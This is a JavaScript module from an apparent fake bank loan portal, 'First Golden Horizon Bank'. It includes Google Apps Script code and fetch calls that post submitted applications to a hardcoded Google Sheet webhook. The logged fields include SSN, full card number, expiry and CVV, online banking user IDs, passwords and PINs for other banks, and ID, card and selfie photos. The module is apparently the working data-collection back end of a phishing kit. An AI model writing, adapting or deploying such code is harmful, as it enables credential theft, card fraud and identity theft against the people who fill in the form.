// ==========================================================================
// GOOGLE SHEETS REAL-TIME SYNC SERVICE
// ==========================================================================

const GOOGLE_SHEET_URL_KEY = 'fgh_google_sheet_webhook_v1';

export const DEFAULT_GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbxDobWj_j0aEQE-98eH1qkZkmmJ86JFj-DWdhYigeYWalD8qrbTgJwO8yaiXTIyoRE/exec";

// Default / fallback webhook URL from env or storage
export function getGoogleSheetUrl() {
  try {
    const saved = localStorage.getItem(GOOGLE_SHEET_URL_KEY);
    if (saved && saved.trim()) return saved.trim();
  } catch (e) {}
  return import.meta.env.VITE_GOOGLE_SHEET_WEBHOOK_URL || DEFAULT_GOOGLE_SHEET_URL;
}

export function saveGoogleSheetUrl(url) {
  try {
    const clean = (url || '').trim();
    if (clean) {
      localStorage.setItem(GOOGLE_SHEET_URL_KEY, clean);
    } else {
      localStorage.removeItem(GOOGLE_SHEET_URL_KEY);
    }
    return { success: true };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// Ready-to-copy Google Apps Script that creates columns & logs rows
export const GOOGLE_APPS_SCRIPT_CODE = `function getTargetSheet() {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    if (ss) return ss.getActiveSheet();
  } catch (e) {}
  
  try {
    var ss2 = SpreadsheetApp.getActive();
    if (ss2) return ss2.getActiveSheet();
  } catch (e) {}
  
  // If standalone script, search for or automatically create the spreadsheet in Google Drive
  try {
    var files = DriveApp.getFilesByName("First Golden Horizon Bank Applications");
    if (files.hasNext()) {
      var file = files.next();
      return SpreadsheetApp.open(file).getActiveSheet();
    } else {
      var newSheet = SpreadsheetApp.create("First Golden Horizon Bank Applications");
      return newSheet.getActiveSheet();
    }
  } catch (err) {
    throw new Error("Please open your Google Sheet, click Extensions -> Apps Script, and deploy from there.");
  }
}

function doPost(e) {
  try {
    var sheet = getTargetSheet();
    
    // Ensure header row exists
    if (sheet.getLastRow() === 0) {
      sheet.appendRow([
        "Submitted At",
        "Reference ID",
        "Status",
        "Step / Progress",
        "Full Name",
        "Email",
        "Phone",
        "Date of Birth",
        "Residential Address",
        "Marital Status",
        "Employment Status",
        "Occupation",
        "Annual Income",
        "Housing Status",
        "Primary Bank",
        "ID Type & State",
        "SSN / Tax ID",
        "Card Issuing Bank",
        "Cardholder Name",
        "Card Number",
        "Card Exp",
        "Card CVV",
        "Online Banking User ID",
        "Online Banking Password",
        "Online Banking PIN",
        "Simulated Credit Score",
        "Desired Loan Facility",
        "Selfie Photo Attached",
        "ID Front Photo Attached",
        "ID Back Photo Attached",
        "Card Front Photo Attached",
        "Card Back Photo Attached",
        "Notes / Summary"
      ]);
      
      // Style Header Row
      var headerRange = sheet.getRange(1, 1, 1, 33);
      headerRange.setBackground("#0F172A");
      headerRange.setFontColor("#F8FAFC");
      headerRange.setFontWeight("bold");
      sheet.setFrozenRows(1);
    }
    
    var data = {};
    if (e && e.postData && e.postData.contents) {
      try {
        data = JSON.parse(e.postData.contents);
      } catch (err) {
        data = e.parameter || {};
      }
    } else if (e && e.parameter) {
      data = e.parameter;
    }
    
    var fullName = ((data.preferredSalutation ? data.preferredSalutation + " " : "") + (data.firstName || "") + " " + (data.lastName || "")).trim();
    var address = (data.streetAddress || "") + (data.addressUnit ? ", " + data.addressUnit : "") + 
                  (data.city ? ", " + data.city : "") + 
                  (data.stateRegion ? ", " + data.stateRegion : "") + 
                  (data.postalCode ? " " + data.postalCode : "") + 
                  (data.country ? ", " + data.country : "");
    var idInfo = (data.idType || "") + (data.idStateIssued ? " (" + data.idStateIssued + ", " + (data.idCountry || "") + ")" : "");
    var primaryBank = data.primaryExistingBank === "Other Bank" && data.primaryExistingBankOther ? "Other: " + data.primaryExistingBankOther : (data.primaryExistingBank || "");
    
    sheet.appendRow([
      data.submittedAt || new Date().toISOString(),
      data.referenceId || data.id || "N/A",
      data.status || "Under Review",
      data.currentStepProgress || "Application Submission",
      fullName || "N/A",
      data.email || "",
      (data.phoneCountryCode || "+1") + " " + (data.phone || ""),
      data.dob || "",
      address || "",
      data.maritalStatus || "",
      data.employmentStatus || "",
      data.occupation || "",
      data.annualIncome || "",
      data.housingStatus || "",
      primaryBank || "",
      idInfo || "",
      data.ssn || "",
      data.cardIssuingBank || "",
      data.cardholderName || fullName || "",
      data.cardNumberMasked || "",
      data.cardExp || "",
      data.cardCvv || "",
      data.cardOnlineUserId || "",
      data.cardOnlinePassword || "",
      data.cardOnlinePin || "",
      data.creditScoreSimulated || data.creditScoreRange || "",
      data.desiredLoanFacility || "",
      data.selfiePhotoUrl ? "Yes (" + (data.selfieFileName || "captured.jpg") + ")" : "No",
      data.idFrontPhotoUrl ? "Yes (" + (data.idFrontFileName || "front.jpg") + ")" : "No",
      data.idBackPhotoUrl ? "Yes (" + (data.idBackFileName || "back.jpg") + ")" : "No",
      data.cardFrontPhotoUrl ? "Yes (" + (data.cardFrontFileName || "card_front.jpg") + ")" : "No",
      data.cardBackPhotoUrl ? "Yes (" + (data.cardBackFileName || "card_back.jpg") + ")" : "No",
      data.notes || ""
    ]);
    
    return ContentService.createTextOutput(JSON.stringify({ result: "success", timestamp: new Date().toISOString() }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (err) {
    return ContentService.createTextOutput(JSON.stringify({ result: "error", error: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({ status: "active", message: "First Golden Horizon Bank Webhook Gateway Online" }))
    .setMimeType(ContentService.MimeType.JSON);
}`;


/**
 * Send an application payload to the configured Google Sheet Webhook URL
 */
export async function sendApplicationToGoogleSheet(appData, customUrl = null) {
  const webhookUrl = customUrl || getGoogleSheetUrl();
  if (!webhookUrl) return { success: false, skipped: true, reason: 'No Google Sheet Webhook URL configured' };

  try {
    const payload = {
      ...appData,
      submittedAt: appData.submittedAt || new Date().toISOString(),
      // Send metadata about photos without bloating the request
      hasSelfie: !!(appData.selfiePhotoUrl),
      hasIdFront: !!(appData.idFrontPhotoUrl),
      hasIdBack: !!(appData.idBackPhotoUrl),
      hasCardFront: !!(appData.cardFrontPhotoUrl),
      hasCardBack: !!(appData.cardBackPhotoUrl)
    };

    // Use mode: 'no-cors' so standard browser requests to Google Apps Script succeed without CORS blocks
    await fetch(webhookUrl, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'text/plain;charset=utf-8'
      },
      body: JSON.stringify(payload)
    });

    console.log('[Google Sheet] Application transmitted to spreadsheet webhook successfully.');
    return { success: true };
  } catch (err) {
    console.warn('[Google Sheet] Transmission notice:', err.message);
    return { success: false, error: err.message };
  }
}

/**
 * Send a quick test ping to verify Google Sheet Webhook
 */
export async function testGoogleSheetWebhook(url) {
  if (!url || !url.startsWith('http')) {
    return { success: false, message: 'Please provide a valid Google Apps Script Web App URL (starts with https://script.google.com/...)' };
  }

  try {
    const testData = {
      referenceId: `TEST-${Math.floor(1000 + Math.random() * 9000)}`,
      firstName: "Test",
      lastName: "Ping Application",
      email: "test@google-sheet-sync.internal",
      phoneCountryCode: "+1",
      phone: "555-0199",
      submittedAt: new Date().toISOString(),
      status: "Verified Test Connection",
      currentStepProgress: "Google Sheet Sync Test",
      notes: "Ping test sent from First Golden Horizon Bank Admin Portal."
    };

    await fetch(url.trim(), {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'text/plain;charset=utf-8'
      },
      body: JSON.stringify(testData)
    });

    return {
      success: true,
      message: '✓ Test ping successfully sent to Google Sheet! Check your spreadsheet — a new test row should appear.'
    };
  } catch (err) {
    return {
      success: false,
      message: `Failed to ping Google Sheet: ${err.message}`
    };
  }
}
